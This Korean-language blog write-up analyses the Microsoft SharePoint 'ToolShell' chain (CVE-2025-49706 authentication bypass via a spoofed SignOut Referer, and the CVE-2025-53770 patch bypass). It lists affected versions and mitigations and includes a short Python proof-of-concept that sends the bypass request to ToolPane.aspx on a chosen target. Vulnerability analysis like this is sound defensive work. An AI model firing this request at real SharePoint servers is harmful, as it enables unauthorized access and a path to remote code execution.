---
title: ["[CVE-2025-49706, 53770] - Microsoft SharePoint Auth Bypass and RCE"]
date: 2025-08-01 09:00:00 +0900
last_modified_at: 2025-07-07 09:00:00 +0900
categories: [writeup, CVE]
tags: [CVE, Microsoft SharepPoint, RCE, Authentication Bypass]
---

# SharePoint 인증 우회 및 RCE 취약점 분석

## 개요
Microsoft SharePoint Server 2019에서 발견된 CVE-2025-49706, CVE-2025-53770은 인증 우회 및 원격 코드 실행(RCE)로 이어질 수 있는 중대한 보안 취약점이다. 

## CVE-2025-49706: Auth Bypass via Referer
이 취약점은 SharePoint의 `PostAuthenticateRequestHandler` 메서드가 `Referer` 헤더에 포함된 `/layouts/SignOut.aspx` 값을 신뢰하는 설계 결함에서 비롯된다. 익명 사용자가 이 값을 설정해 인증이 필요한 페이지에 접근할 수 있게 된다.

### 인증 우회 동작 로직
```csharp
if (flag1) {
  Uri uri = context.Request.UrlReferrer;
  ...
  if (uri != null && uri.AbsolutePath == "/_layouts/SignOut.aspx") {
    flag1 = false;
    flag2 = true;
  }
}
```
- `flag1`가 true이고 Refere가 SignOut이면 인증 체크가 우회된다.
- 이 결과, 로그인하지 않은 상태에서도 WebPart 설정 페이지인 `/ToolPane.aspx`에 접근 가능해진다.

### 영향을 받는 환경
- SharePoint Server Subscription Edition - earlier than KB5002768
- SharePoint Server 2019 - earlier than 16.0.10417.20027 / KB5002754
- SharePoint Server 2016
  
## CVE-2025-53770 : easily bypassable patch
Microsoft는 `DisableSignOutRefererHeaderBypassLimit` 설정 플래그와 `ToolPane.aspx` 엔드포인트 필터링을 통해 CVE-2025-49706을 차단하려 했지만, 문자열 비교에만 의존한 패치 방식은 완전히 우회 가능했다.
- `/ToolPane.aspx/`와 같이 마지막에 슬래시를 붙이면 우회된다.
- 결국 인증 우회 후 Deserialization 취약점을 통해 RCE로 이어질 수 있다.

## PoC
```python
import requests
from urllib.parse import urljoin
import argparse

parser = argparse.ArgumentParser()
parser.add_argument("--url", required=True, help="Target URL")
args = parser.parse_args()

session = requests.Session()
headers = {'Referer': '/_layouts/SignOut.aspx'}
data = {'MSOTlPn_Uri': '', 'MSOTlPn_DWP': ''}

endpoint = urljoin(args.url, '/_layouts/16/ToolPane.aspx?DisplayMode=Edit')
response = session.post(endpoint, headers=headers, data=data)

if response.status_code == 200:
    print("[+] Authentication Bypass Successed")
    print(response.text[:500])  
else:
    print("[-] Failed: ", response.status_code)
```

해당 PoC는 로드인 없이 `ToolPane.aspx`에 접근해 WebPart 처리를 유도하고, 요청 파라미터를 Deserialization하는 과정에서 RCE가 가능하다.

## 실제 위험성 및 공격 시나리오

이 취약점은 단독으로 사용될 수도 있지만, `ToolPane.aspx` 페이지가 요청 데이터를 Deserialization하는 과정에서 발생하는 다른 취약점(CVE-2025-53770)과 결합될 경우, RCE까지 이어질 수 있다. 실제로 두 취약점은 결합되어 "ToolShell"이라는 익스플로잇 체인으로 사용되었다.

1. 공격자는 Referer 헤더를 `/layouts/SignOut.aspx`로 설정하여 인증 우회(CVE-2025-49706)
2. 이후 `ToolPane.aspx`에 접근해 악의적인 데이터를 전송하여 원격 코드 실행(CVE-2025-53770)

이러한 공격이 성공하면 공격자는 웹쉘 설치, 내부 네트워크 침투 등 심각한 보안 위협을 가할 수 있다.

## 대응 방안
* Microsoft에서 발표한 보안 업데이트(KB5002754, KB5002768)를 적용
* `DisableSignOutRefererHeaderBypassLimit` 플래그를 활성화하여 Referer 헤더를 통한 인증 우회 방지 로직을 강화
* AMSI 활성화 및 Defender 등의 백신 솔루션을 SharePoint 서버에 적용
* 인증 토큰 탈취 방지를 위해 `MachineKey` 값을 변경하고 IIS를 재시작


## Reference
- [CVE-2025-49706 | Microsoft SharePoint Server Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-49706)
- [SharePoint Vulnerabilities (CVE-2025-53770 & CVE-2025-53771): Everything You Need to Know](https://www.wiz.io/blog/sharepoint-vulnerabilities-cve-2025-53770-cve-2025-53771-everything-you-need-to-k)
- [ToolShell: a story of five vulnerabilities in Microsoft SharePoint](https://securelist.com/toolshell-explained/117045/)